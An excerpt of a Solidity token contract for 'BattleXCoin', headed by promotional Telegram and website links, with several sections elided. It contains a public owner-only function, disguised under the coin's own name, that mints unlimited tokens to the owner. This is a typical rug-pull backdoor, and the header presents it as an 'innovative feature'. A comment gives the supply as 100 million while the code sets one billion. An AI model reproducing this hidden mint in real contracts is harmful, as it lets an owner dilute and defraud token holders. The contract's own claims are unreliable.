//
// $BattleXCoin proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BattleXCoin
// 📱 Website ::https://Battlexc.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BattleXCoin(uint256 amount) public onlyOwner {
 _BattleXCoin(msg.sender, amount);
    }
    ...
    function _BattleXCoin(address account, uint256 amount) internal virtual {
...
contract $BattleXCoin is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Battle XCoin", "BATTLEXC") {
     _BattleXCoin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}